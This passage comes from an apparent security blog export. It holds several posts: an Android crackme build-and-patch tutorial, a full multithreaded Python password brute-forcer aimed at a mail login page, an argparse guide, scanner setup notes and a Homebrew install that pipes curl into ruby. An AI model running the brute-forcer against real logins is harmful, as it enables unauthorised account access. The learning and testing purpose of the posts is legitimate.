stock.&quot;;&#125;?&gt; 当前个人对API接口测试的理解尚比较粗浅。涉及到fuzz、加解密及其他复杂的场景尚且无法拿出好的案例及测试平台。后续有机会再行补充，另外，希望有货的大佬们能多多分享。 参考资料测试工具 Ready!API ( SoapUI ) Burpsuite FuzzAPI 测试平台 DVWS https://github.com/snoopythesecuritydog/dvws bWAPP https://sourceforge.net/projects/bwapp/ Hackazon https://github.com/rapid7/hackazon Web Version http://hackazon.webscantest.com Mutillidae https://sourceforge.net/projects/mutillidae/ Juice-shop https://github.com/bkimminich/juice-shop 参考资料 OWASP Top 10 - 2017 RC1 REST API 安全设计指南 http://www.freebuf.com/articles/web/82108.html REST Security Cheat Sheet https://www.owasp.org/index.php/REST_Security_Cheat_Sheet]]></content>
      <tags>
        <tag>接口安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android开发及破解入门实例]]></title>
    <url>%2F2017%2FAndroid%E5%BC%80%E5%8F%91%E5%8F%8A%E7%A0%B4%E8%A7%A3%E5%85%A5%E9%97%A8%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[原本尝试刷一把某SRC，结果因为其对外服务的基本都是APP，故而尝试逆向其APK。 结果可想而知，一脸懵逼，无从入手。 故而找了个本《Android软件安全与逆向分析》，照着学学。 开发环境安装Android开发者官网 Android Studio下载页面 Android Studio 2.3.3.0 for mac下载直连 Android NDK # 其实这个工具在这里并没有用到，可以等后续再下载安装。 # Android Studio包含了JDK，故而不需要单独安装JDK。上述链接应该是都需要翻墙才能访问。 项目编码打开AS，一路Next，就新建好一个项目。 第一次新建项目，可能会卡住，跟一个叫gradle的东西相关，可以选择慢慢等，也可以考虑手动从官方下载（gradle-3.3），然后替换了本地下载尚未下载完成的~/.gradle/wrapper/dists/gradle-3.3-all/55gk2rcmfc6p2dg9u9ohc3hw9/gradle-3.3-all.zip文件。 打开app/res/layout/activity_main.xml,设计layout。 采用Android最新的约束性布局ConstraintLayout。 具体的xml代码如下：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;android.support.constraint.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; tools:context=&quot;cn.oddboy.xx.crackme01.MainActivity&quot; tools:layout_editor_absoluteY=&quot;81dp&quot; tools:layout_editor_absoluteX=&quot;0dp&quot;&gt; &lt;TextView android:id=&quot;@+id/textView&quot; android:layout_width=&quot;368dp&quot; android:layout_height=&quot;25dp&quot; android:text=&quot;@string/str_androidInstance&quot; android:textAlignment=&quot;center&quot; android:textAllCaps=&quot;false&quot; android:textSize=&quot;18sp&quot; android:textStyle=&quot;bold&quot; app:layout_constraintRight_toRightOf=&quot;parent&quot; app:layout_constraintLeft_toLeftOf=&quot;parent&quot; app:layout_constraintBottom_toTopOf=&quot;@+id/userName&quot; app:layout_constraintTop_toTopOf=&quot;parent&quot; /&gt; &lt;TextView android:id=&quot;@+id/textView2&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;17dp&quot; android:text=&quot;@string/str_serialNo&quot; android:textAlignment=&quot;center&quot; android:textSize=&quot;14sp&quot; app:layout_constraintBottom_toBottomOf=&quot;@+id/sn&quot; app:layout_constraintTop_toTopOf=&quot;@+id/sn&quot; app:layout_constraintLeft_toLeftOf=&quot;parent&quot; app:layout_constraintRight_toLeftOf=&quot;@+id/sn&quot; /&gt; &lt;TextView android:id=&quot;@+id/textView3&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;17dp&quot; android:text=&quot;@string/str_username&quot; android:textAlignment=&quot;center&quot; android:textSize=&quot;14sp&quot; app:layout_constraintBottom_toBottomOf=&quot;@+id/userName&quot; app:layout_constraintTop_toTopOf=&quot;@+id/userName&quot; app:layout_constraintRight_toLeftOf=&quot;@+id/userName&quot; app:layout_constraintLeft_toLeftOf=&quot;parent&quot; /&gt; &lt;EditText android:id=&quot;@+id/sn&quot; android:layout_width=&quot;215dp&quot; android:layout_height=&quot;43dp&quot; android:ems=&quot;10&quot; android:hint=&quot;@string/str_input16chars&quot; android:inputType=&quot;textPersonName&quot; app:layout_constraintBottom_toTopOf=&quot;@+id/button&quot; app:layout_constraintLeft_toLeftOf=&quot;@+id/userName&quot; app:layout_constraintRight_toRightOf=&quot;@+id/userName&quot; app:layout_constraintTop_toBottomOf=&quot;@+id/userName&quot; /&gt; &lt;EditText android:id=&quot;@+id/userName&quot; android:layout_width=&quot;215dp&quot; android:layout_height=&quot;43dp&quot; android:ems=&quot;10&quot; android:hint=&quot;@string/str_pleaseinputusername&quot; android:inputType=&quot;textPersonName&quot; app:layout_constraintBottom_toTopOf=&quot;@+id/sn&quot; app:layout_constraintLeft_toRightOf=&quot;@+id/textView3&quot; app:layout_constraintRight_toRightOf=&quot;parent&quot; app:layout_constraintTop_toBottomOf=&quot;@+id/textView&quot; /&gt; &lt;Button android:id=&quot;@+id/button&quot; android:layout_width=&quot;88dp&quot; android:layout_height=&quot;48dp&quot; android:text=&quot;@string/str_register&quot; app:layout_constraintTop_toBottomOf=&quot;@+id/sn&quot; app:layout_constraintRight_toRightOf=&quot;parent&quot; app:layout_constraintLeft_toLeftOf=&quot;parent&quot; android:layout_marginTop=&quot;-13dp&quot; app:layout_constraintHorizontal_bias=&quot;0.858&quot; /&gt;&lt;/android.support.constraint.ConstraintLayout&gt; 打开app/java/cn.oddboy.xx.crackme01/MainActivity.java,编写逻辑代码。 package cn.oddboy.xx.crackme01;import android.support.v7.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); setTitle(R.string.unregister); final EditText edit_userName=(EditText)findViewById(R.id.userName); final EditText edit_sn=(EditText)findViewById(R.id.sn); final Button btn_reg=(Button)findViewById(R.id.button); btn_reg.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View view) &#123; if (!checkSN(edit_userName.getText().toString().trim(),edit_sn.getText().toString().trim())) &#123; Toast.makeText(MainActivity.this, R.string.unsucessed, Toast.LENGTH_SHORT).show(); &#125;else &#123; Toast.makeText(MainActivity.this, R.string.successed,Toast.LENGTH_SHORT).show(); btn_reg.setEnabled(false); setTitle(R.string.registered); &#125; &#125; &#125;); &#125; public static String bytesToHex(byte[] in) &#123; final StringBuilder builder = new StringBuilder(); for(byte b : in) &#123; builder.append(String.format(&quot;%02x&quot;, b)); &#125; return builder.toString(); &#125; private boolean checkSN(String userName, String sn)&#123; try&#123; if ((userName==null)||(userName.length()==0)) return false; if ((sn==null)||(sn.length()==0)) return false; MessageDigest digest=MessageDigest.getInstance(&quot;MD5&quot;); digest.reset(); digest.update(userName.getBytes()); byte[] bytes=digest.digest(); String hexstr= bytesToHex(bytes); StringBuilder sb = new StringBuilder(); for (int i=0;i&lt;hexstr.length();i+=2)&#123; sb.append(hexstr.charAt(i)); &#125; String userSN=sb.toString(); if (!userSN.equalsIgnoreCase(sn)) return false; &#125; catch (NoSuchAlgorithmException e)&#123; e.printStackTrace(); return false; &#125; return true; &#125;&#125; app/res/values/strings.xml&lt;resources&gt; &lt;string name=&quot;app_name&quot;&gt;Crackme01&lt;/string&gt; &lt;string name=&quot;unregister&quot;&gt;程序未注册&lt;/string&gt; &lt;string name=&quot;unsucessed&quot;&gt;无效用户名或注册码&lt;/string&gt; &lt;string name=&quot;successed&quot;&gt;恭喜您！注册成功&lt;/string&gt; &lt;string name=&quot;registered&quot;&gt;程序已注册&lt;/string&gt; &lt;string name=&quot;str_register&quot;&gt;注册&lt;/string&gt; &lt;string name=&quot;str_androidInstance&quot;&gt;Android程序破解演示实例&lt;/string&gt; &lt;string name=&quot;str_username&quot;&gt;用户名&lt;/string&gt; &lt;string name=&quot;str_serialNo&quot;&gt;注册码&lt;/string&gt; &lt;string name=&quot;str_pleaseinputusername&quot;&gt;请输入用户名&lt;/string&gt; &lt;string name=&quot;str_input16chars&quot;&gt;请输入16位注册码&lt;/string&gt;&lt;/resources&gt; 让程序Run起来在AS中run - Run”app”，如果没有虚拟机，可以新建一个。 发布APK “Build -&gt; Build APK” 一键生成APK，但这种方式生成APK应该不能安装（因为没有签名） “Build -&gt; Generate Signed APK”。选择keystore然后Next就可以了。 此处也可以用keytool工具生成keystore文件。命令如下： keytool -genkey -v -keystore bingo.keystore -alias bingo -keyalg RSA -validity 10000 APK逆向 APK逆向的可用工具太多了，我完全懵逼了。这里只说明我用的工具，到底还有什么好用的工具我是不知道的。 apktool 用于反编译和重新编译 ➜ apktool d crackme01.apkI: Using Apktool 2.2.3 on crackme01.apkI: Loading resource table...I: Decoding AndroidManifest.xml with resources...I: Loading resource table from file: /Users/jason/Library/apktool/framework/1.apkI: Regular manifest package...I: Decoding file-resources...I: Decoding values */* XMLs...I: Baksmaling classes.dex...I: Copying assets and libs...I: Copying unknown files...I: Copying original files... 把整个生成的crackme01文件夹拽入visual studio code中。 搜索关键字”无效用户名或注册码”，在res/values/strings.xml中找到: &lt;string name=&quot;unsucessed&quot;&gt;无效用户名或注册码&lt;/string&gt; 搜索关键字”unsucessed”,在res/values/public.xml中找到: &lt;public type=&quot;string&quot; name=&quot;unsucessed&quot; id=&quot;0x7f06002b&quot; /&gt; 搜索关键字”0x7f06002b”,在smali/cn/oddboy/xx/crackme01/MainActivity$1.smali中找到响应的代码。 具体代码的分析，我还不太会。按照书上的说法，将94行的if-nez指令改为if-eqz指令即可，保存。 重新生成APK ➜ apktool b crackme01I: Using Apktool 2.2.3I: Checking whether sources has changed...I: Smaling smali folder into classes.dex...I: Checking whether resources has changed...I: Building resources...I: Building apk file...I: Copying unknown files/dir...# 生成的APK在crackme01/dist/crackme01.apk 重新签名 ➜ jarsigner -verbose -keystore test.keystore crackme01/dist/crackme01.apk aaa输入密钥库的密码短语: 正在添加: META-INF/MANIFEST.MF 正在添加: META-INF/AAA.SF 正在添加: META-INF/AAA.RSA 正在签名: AndroidManifest.xml 正在签名: classes.dex ...... 正在签名: resources.arscjar 已签名。 后记路还远着，无FUCK说。 搞这么点东西，也花了一整天时间了。]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多线程爆破脚本(python3)]]></title>
    <url>%2F2017%2F%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC-python3%2F</url>
    <content type="text"><![CDATA[起因，，，其实就是老板派的活，结合以前写过的脚本，略微完善了一下下，比较合适作为简单参考，找找代码感觉。本文也主要是解释说明代码。 主要功能脚本使用了命令行解析工具：argparser，所以直接-h查看帮助。 关于这个库的使用，可以参考我之前写过的blog：Python argparse模块详解 ➜ pythonCode python3 BingoBF.py -h .--. |o_o | ------------------ |:_/ | &lt; Author: Mr.Bingo &gt; // \ \ ------------------ (| | ) &lt; oddboy.cn &gt; /&apos;\_ _/`\ ------------------ \___)=(___/usage: BingoBF [options]Brute Force 【https://mail.xxx.com] email&apos;s passwords.optional arguments: -h, --help show this help message and exit -u USERNAME username -U USERLIST usernames -p PASSWORD password -P PWDLIST passwords -o OUTPUT print results to file -t THREAD mutli threads, default 3 threads+---+ 代码解释#!/usr/bin/env python3# -*- coding: utf-8 -*-import loggingimport argparseimport queueimport requestsimport threadingimport osimport timeimport randomfrom html.parser import HTMLParserfrom requests.packages.urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)# disable InsecureRequestWarning# 由于目标站点使用的证书过期了，导致我在使用requests库请求时将verify设置为FALSE，同时配置了proxies(指向本地Burp)。而requests依赖的底层库urllib3总是报Warning，所以使用上面语句disable掉这个Warning。可以参考如下链接：# https://stackoverflow.com/questions/27981545/suppress-insecurerequestwarning-unverified-https-request-is-being-made-in-pythologging.basicConfig(level=logging.WARNING) # 用logging,避免调试时满篇的print.（但本脚本中基本没怎么用。。。）# general settingstarget_url=&quot;https://mail.xxx.com/UserLogin.aspx&quot;writeFileLock = threading.Lock() # 创建文件锁，避免写文件冲突。threadLock = threading.Lock() #创建线程锁，避免对显示效果的影响。# 保存爆破结果def saveFile(message,outfilePath): with open(outfilePath, &apos;a+&apos;, encoding = &apos;utf8&apos;) as f: # 以追加的方法结果写入文件 f.write(message[0]+&quot;\t&quot;) f.write(message[1]+&quot;\n&quot;)# 自定义一个Exception类,用于显示自定义的异常。class validcodeException(BaseException): def __init__(self,mesg=&quot; @@@@@@@@@@@@@@@ valid code is wrong!!!!!!!&quot;): print(mesg)# 解析响应报文，主要用户提取服务器响应回来的表单字段，顶好用的玩意儿。官方文档：https://docs.python.org/3.6/library/html.parser.html?highlight=htmlparserclass BruteParser(HTMLParser): def __init__(self): HTMLParser.__init__(self) self.tag_results = &#123;&#125; def handle_starttag(self, tag, attrs): if tag == &quot;input&quot;: tag_name = None tag_value = None for name, value in attrs: if name == &quot;name&quot;: tag_name = value if name == &quot;value&quot;: tag_value = value if (tag_name == &quot;__VIEWSTATE&quot;) or (tag_name == &quot;__VIEWSTATEGENERATOR&quot;) or (tag_name == &quot;__EVENTVALIDATION&quot;): self.tag_results[tag_name] = tag_value# 核心实现类class Bruter(object): def __init__(self, threads,userList,pwdList,outfilePath): self.user_q=userList self.pwdlist=list(pwdList.queue) # 对于每个用户名，密码列表需要重复使用，所以不合适用队列，故而转换为list。 self.threads=threads self.outfilePath=outfilePath print(&quot;Total %d(%d * %d) tries( %d threads)&quot;% (self.user_q.qsize()*len(self.pwdlist),self.user_q.qsize(),len(self.pwdlist),self.threads)) # 线程的创建与管理 def run_bruteforce(self): thread_arr=[] # 线程列表list for i in range(self.threads): t = threading.Thread(target=self.web_bruter) thread_arr.append(t) # 创建线程 for i in range(self.threads): thread_arr[i].start() # 开启线程 for i in range(self.threads): thread_arr[i].join() # 回归线程 # 核心方法 def web_bruter(self): proxies = &#123; &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;, &quot;https&quot;: &quot;https://127.0.0.1:8080&quot;, &#125; # Burpsuite的代理地址 # 初始化cookie以及hidden元素数据。 response = requests.get(target_url,proxies=proxies,verify=False) cookie=response.cookies # 解析异常表单字段 parser = BruteParser() parser.feed(response.text) post_tags = parser.tag_results post_tags[&apos;cmdSubmit.x&apos;]=random.randint(1,47) # 登录按钮图片 47x39像素 post_tags[&apos;cmdSubmit.y&apos;]=random.randint(1,39) # 从队列中取需要爆破的用户名，在多线程中使用queue比较方便。 while not self.user_q.empty(): username = self.user_q.get().rstrip().decode(&quot;ascii&quot;) for password in self.pwdlist: password=password.decode(&quot;ascii&quot;) post_tags[&quot;txtUsername&quot;]=username post_tags[&quot;txtPassword&quot;]=password threadLock.acquire() # 取得线程锁，使用线程锁，避免出现显示效果被打乱的情况。 # \r将光标回退到行首（\b回退一格）,实现原地覆盖。 print(&quot; \b\b&quot;*100,end=&quot;&quot;) # 退两格，清空一格。 实现清空。 print(&quot;\rTrying: %15s : %15s (%d users left)&quot; % (username,password, self.user_q.qsize()),end=&quot;&quot;) #time.sleep(2) # 调试时使用的 threadLock.release() # 释放线程锁 reqResult = requests.post(target_url,data=post_tags,cookies=cookie,allow_redirects=True,proxies=proxies,verify=False) if (&quot;欢迎使用XXX邮件系统&quot; in reqResult.text): # 爆破成功 threadLock.acquire() # 取得线程锁 print(&quot; \b\b&quot;*100,end=&quot;&quot;) print (&quot;\r[*] --&gt; %15s\t%15s&quot; % (username,password)) # 打印到窗口 #time.sleep(2) threadLock.release() # 释放线程锁 if self.outfilePath is not None: # 输出到文件 # 获取文件锁 writeFileLock.acquire() try: # 追加到文件 saveFile((username,password),self.outfilePath) finally: # 释放锁 writeFileLock.release() break # 跳出当前循环，进行下一个用户名爆破 if (&quot;您输入的验证码不正确，请重新输入!&quot; in reqResult.text): # 验证码错误，抛出异常！ raise validcodeException(&quot;验证码错误，需要检查代码！！！！☆☆☆☆☆☆☆&quot;) exit # 退出！ 理论上不会执行这一句。 # 由于该登陆点存在验证码失效的问题，所以按理不会出现验证码不准确的情况，故而，也没继续完善代码。 如有需要，可自行完善。 if (&quot;对不起, 您输入的用户名或口令错误, 请重新输入。&quot; in reqResult.text): pass # 占一个坑，没鸟用 pass #time.sleep(2)# 读取文件，生成队列def build_list(listFile): # read in the list file fd = open(listFile, &quot;rb&quot;) raw_words = fd.readlines() fd.close() words = queue.Queue() for word in raw_words: word = word.rstrip() words.put(word) return wordsdef main(): headCharPic=&quot;\r .--.\n |o_o | ------------------ \n |:_/ | &lt; Author: Mr.Bingo &gt;\n // \ \ ------------------ \n (| | ) &lt; oddboy.cn &gt;\n /&apos;\_ _/`\ ------------------\n \___)=(___/\n&quot; print(headCharPic) # 创建一个argparser解析器 parser=argparse.ArgumentParser( prog=&quot;BingoBF&quot;, usage=&quot; %(prog)s [options] &quot;, description=&apos;Brute Force 【https://mail.xxx.com] email\&apos;s passwords.&apos;, epilog=&quot;+---+\n&quot; ) groupUser = parser.add_mutually_exclusive_group(required=True) groupUser.add_argument(&apos;-u&apos;,dest=&quot;username&quot;,help=&quot;username&quot;) groupUser.add_argument(&apos;-U&apos;,dest=&apos;userList&apos;,help=&quot;usernames&quot;) groupPwd = parser.add_mutually_exclusive_group(required=True) groupPwd.add_argument(&apos;-p&apos;,dest=&quot;password&quot;,help=&quot;password&quot;) groupPwd.add_argument(&apos;-P&apos;,dest=&apos;pwdList&apos;,help=&quot;passwords&quot;) parser.add_argument(&apos;-o&apos;,dest=&apos;output&apos;,help=&quot;print results to file&quot;) parser.add_argument(&quot;-t&quot;,dest=&quot;thread&quot;,type=int,help=&quot;mutli threads, default 3 threads&quot;,default=3) args=parser.parse_args() # 命令行参数解析 if args.username is not None: userList=list(args.username) else: userList = build_list(args.userList) if args.password is not None: pwdList=list(args.password) else: pwdList = build_list(args.pwdList) outfilePath = None if args.output is not None: outfilePath = args.output filePath,fileName=os.path.split(outfilePath) if (filePath!=&quot;&quot;) and (not os.path.exists(filePath)): os.mikedirs(filePath) # 若不存在这个目录则递归创建 if args.thread is not None: user_thread=args.thread bruter_obj = Bruter(user_thread,userList,pwdList,outfilePath) bruter_obj.run_bruteforce()if __name__ == &apos;__main__&apos;: main() 调用sample➜ ~ python3 BingoBF.py -U user.txt -P pwd.txt -o Outfile.txt 附赠命令行中显示的企鹅字符画是用一个叫cowsay的工具弄的，感兴趣自己百谷。]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python argparse模块详解]]></title>
    <url>%2F2017%2FPython-argparse%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[argparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。 官方文档中讲到的，本文基本都提到了，但只是简要记录，如果需要深入理解，可查看原文。 https://docs.python.org/3/library/argparse.html 使用步骤import argparse # 导入模板parser = argparse.ArgumentParser() # 创建parserparser.add_argument() # 添加参数args = parser.parse_args() # 参数解析 ArgumentParser对象class argparse.ArgumentParser( prog=None, # 设定程序名称 (defaul: sys.argv[0]) usage=None, # 替换默认的Usage信息 description=None, # 程序简要信息说明(参数说明前) epilog=None, # 附加信息说明(参数说明后) parents=[], # 继承父解析器(parser) formatter_class=argparse.HelpFormatter, # 自定义帮忙信息显示格式(4种) prefix_chars=&apos;-&apos;, # 参数前缀符号(默认为-,如：-h/--help) fromfile_prefix_chars=None, # 从文件中引用参数（与在命令行直接写作用一致，解决参数过多的情况） argument_default=None, # 可设置argparse.SUPPRESS阻止默认参数默认值 conflict_handler=&apos;error&apos;, # 参数冲突处理 add_help=True, # 帮助信息中默认添加&quot;-h, --help&quot;描述 allow_abbrev=True # 允许参数缩写 ) add_argument()方法ArgumentParser.add_argument( name or flags... # 选项的名称或列表,例如：foo/-f/--foo [, action] # 采取的基本操作 store(默认) 存储参数值 store_const 使用该字符串选项时，取用const值 store_true 使用该字符串选项时，参数值置为True store_false 使用该字符串选项时，参数值置为False append 同一个命令行中多次使用该字符串选项时，以追加的方式将值添加到list中 append_const 将多个字符串选项的const值合并到一个list count 统计选项出现的次数 （如：&quot;-vvv&quot;,则最终值为3） help parser默认会添加一个help action。(一般不用理会) version 打印版本信息 也可以自定义action类 [, nargs] # 该参数值要求的数量 数值 指明参数个数 ? 提供了参数则取参数值； 无参数但声明了选项字符串则取const值； 无参数也未声明选择字符串则取default值 * 所有参数存入list + 与*类似，但参数个数不能为空 argparse.REMAINDER 原封不动的记录参数到list中，通常用于将这些参数传递到其它的命令行工具。 [, const] # action/nargs部分要求的常值 1、当action=&quot;store_const&quot;或者&quot;append_const&quot;时需要设置 2、当选项为(-f/--foo),nargs=&apos;?&apos;，同时未提供具体参数时，取用该值。 [, default] # 参数默认值 [, type] # 参数类型（内建参数或者函数，也可是自定义函数） [, choices] # 允许的参数值（白名单）,tuple/range [, required] # 选项是否必须，设置为True表示选项必填。 [, help] # 参数说明,可以用其它类似 %(prog)s 格式调用prog值；可设置argparse.SUPPRESS使该选项在帮助信息中不可见。 [, metavar] # 定义参数在Usage信息中的名称 [, dest] # 解析后的属性名称 ) 自定义action class argparse.Action(option_strings, dest, nargs=None, const=None, default=None, type=None, choices=None, required=False, help=None, metavar=None) parse_args()方法ArgumentParser.parse_args(args=None, namespace=None) 一般情况下，我们直接使用如下命令就可以了：# args=None, 程序将sys.argv作为参数代入args = parse.parse_args() # 给args赋值，跳过sys.argv，主要用于测试工作，避免每次运行都输入冗长的参数。args = parser.parse_args(['1', '2', '3', '4'])# namespace=custom_class，将属性分配到一个已经存在的对象中。parser.parse_args(args=['--foo', 'BAR'], namespace=custom_class99) 其它工具 子命令 很多程序把它的功能分到几个子程序中，比如：pip install , pip download , pip uninstall 等. 通过这种方式，可以很方便处理不同程序的参数。 ArgumentParser.add_subparsers([title][, description][, prog][, parser_class][, action][, option_string][, dest][, help][, metavar]) &gt;&gt;&gt; parser = argparse.ArgumentParser()&gt;&gt;&gt; subparsers = parser.add_subparsers(dest='subparser_name')&gt;&gt;&gt; subparser1 = subparsers.add_parser('1')&gt;&gt;&gt; subparser1.add_argument('-x')&gt;&gt;&gt; subparser2 = subparsers.add_parser('2')&gt;&gt;&gt; subparser2.add_argument('y')&gt;&gt;&gt; parser.parse_args(['2', 'frobble'])Namespace(subparser_name='2', y='frobble') 文件类型对象 add_argument()中的FileType的参数”工厂”。 class argparse.FileType(mode=’r’, bufsize=-1, encoding=None, errors=None) &gt;&gt;&gt; parser = argparse.ArgumentParser()&gt;&gt;&gt; parser.add_argument('--raw', type=argparse.FileType('wb', 0))&gt;&gt;&gt; parser.add_argument('out', type=argparse.FileType('w', encoding='UTF-8'))&gt;&gt;&gt; parser.parse_args(['--raw', 'raw.dat', 'file.txt'])Namespace(out=&lt;_io.TextIOWrapper name='file.txt' mode='w' encoding='UTF-8'&gt;, raw=&lt;_io.FileIO name='raw.dat' mode='wb'&gt;) 参数分组 在Usage信息中的参数分组，如pip -h可以看到”Commands”,”General Options”分组。 ArgumentParser.add_argument_group(title=None, description=None) &gt;&gt;&gt; parser = argparse.ArgumentParser(prog='testPROG', add_help=False)&gt;&gt;&gt; group1 = parser.add_argument_group('group1', 'group1 description')&gt;&gt;&gt; group1.add_argument('foo', help='foo help')&gt;&gt;&gt; group2 = parser.add_argument_group('group2', 'group2 description')&gt;&gt;&gt; group2.add_argument('--bar', help='bar help')&gt;&gt;&gt; parser.print_help()usage: testPROG [--bar BAR] foogroup1:group1 descriptionfoo foo helpgroup2:group2 description--bar BAR bar help 互斥 参数互斥！ ArgumentParser.add_mutually_exclusive_group(required=False) &gt;&gt;&gt; parser = argparse.ArgumentParser(prog='PROG')&gt;&gt;&gt; group = parser.add_mutually_exclusive_group(required=True)&gt;&gt;&gt; group.add_argument('--foo', action='store_true')&gt;&gt;&gt; group.add_argument('--bar', action='store_false')&gt;&gt;&gt; parser.parse_args([])usage: PROG [-h] (--foo | --bar)PROG: error: one of the arguments --foo --bar is required 解析器默认配置 在解析器级别给参数设置默认值(优先级高于在add_argument方法中的设置)，也可以获取默认值。 ArgumentParser.set_defaults(**kwargs) # 设置默认值 ArgumentParser.get_default(dest) # 获取默认值 &gt;&gt;&gt; parser = argparse.ArgumentParser()&gt;&gt;&gt; parser.add_argument('foo', type=int)&gt;&gt;&gt; parser.set_defaults(bar=42, baz='badger') # 不审查是否在命令行中声明，故而bar，baz可以直接添加&gt;&gt;&gt; parser.parse_args(['736'])Namespace(bar=42, baz='badger', foo=736)&gt;&gt;&gt; parser = argparse.ArgumentParser()&gt;&gt;&gt; parser.add_argument('--foo', default='bar') # 解析器级别默认值总是覆盖参数级别默认值&gt;&gt;&gt; parser.set_defaults(foo='spam')&gt;&gt;&gt; parser.parse_args([])Namespace(foo='spam')&gt;&gt;&gt; parser = argparse.ArgumentParser()&gt;&gt;&gt; parser.add_argument('--foo', default='badger')&gt;&gt;&gt; parser.get_default('foo') # 获取默认值'badger' 打印帮忙 用于打印帮助信息。 ArgumentParser.print_usage(file=None) ArgumentParser.print_help(file=None) ArgumentParser.format_usage() ArgumentParser.format_help() 部分解析 有些脚本只解析部分参数，放过其余的参数以便传递给其它脚本或程序。 这种情况下使用 parse_known_args() 。跟parse_args()用法一样，但当参数过多的情况下并不会报错，而是将多余的参数放到一个新的tuple中。 ArgumentParser.parse_known_args(args=None, namespace=None) &gt;&gt;&gt; parser = argparse.ArgumentParser()&gt;&gt;&gt; parser.add_argument('--foo', action='store_true')&gt;&gt;&gt; parser.add_argument('bar')&gt;&gt;&gt; parser.parse_known_args(['--foo', '--badger', 'BAR', 'spam'])(Namespace(bar='BAR', foo=True), ['--badger', 'spam']) # ['--badger', 'spam']即为多余的参数。 自定义文件解析 退出方法 optparse代码升级 原本argparse是与optparse保持兼容的，但是！@#￥%……&amp;*（。升级办法如下： Replace all optparse.OptionParser.add_option() calls with ArgumentParser.add_argument() calls. Replace (options, args) = parser.parse_args() with args = parser.parse_args() and add additional ArgumentParser.add_argument() calls for the positional arguments. Keep in mind that what was previously called options, now in argparse context is called args. Replace callback actions and the callback_* keyword arguments with type or action arguments. Replace string names for type keyword arguments with the corresponding type objects (e.g. int, float, complex, etc). Replace optparse.Values with Namespace and optparse.OptionError and optparse.OptionValueError with ArgumentError. Replace strings with implicit arguments such as %default or %prog with the standard Python syntax to use dictionaries to format strings, that is, %(default)s and %(prog)s. Replace the OptionParser constructor version argument with a call to parser.add_argument(‘–version’, action=’version’, version=’‘).]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[弱口令检测工具fenghuangscanner的安装与使用]]></title>
    <url>%2F2017%2F%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7fenghuangscanner%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[下载地址 : https://github.com/wilson9x1/fenghuangscannercd fenghuangscannerpip install -r requirements.txt # 安装依赖包python fenghuangscanner.py -h # 运行# 在安装依赖包的过程中可能会报错。 主要是pymssql这个包brew install freetdspip install cython# 如果仍然不行，使用下面命令安装最新的pymssqlpip install git+https://github.com/pymssql/pymssql.git# Because 2.2.0 still hasn't made it to PyPI as of this comment, the following command from @bkanuka still works and installed smoothly without a single error:# pip install git+https://github.com/pymssql/pymssql.git 问题参考 https://github.com/Homebrew/homebrew-python/issues/338 使用python fenghuangscan.py --ip 192.168.199.0/24 主机存活扫描 –&gt; 端口扫描 –&gt; 弱口令爆破]]></content>
  </entry>
  <entry>
    <title><![CDATA[install homebrew and wine on mac]]></title>
    <url>%2F2017%2Finstall-homebrew-and-wine-on-mac%2F</url>
    <content type="text"><![CDATA[wine安装# 安装homebrew/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"# 安装winebrew install wine# 会提示wine: XQuartz is required to install this formula.X11Requirement unsatisfied!# 按照提示信息到https://xquartz.macosforge.org下载xquartz或者直接运行：brew cask install xquartz&lt;!-- more --&gt;# 安装成功后，再次：brew install wine# 检查wine 安装状态wine --version# 使用wine打开exe程序wine winfile.exe brew cask :: http://caskroom.github.io XQuartz :: https://www.xquartz.org]]></content>
  </entry>
  <entry>
    <title><![CDATA[Nmap cheat sheet]]></title>
    <url>%2F2017%2FNmap-cheat-sheet%2F</url>
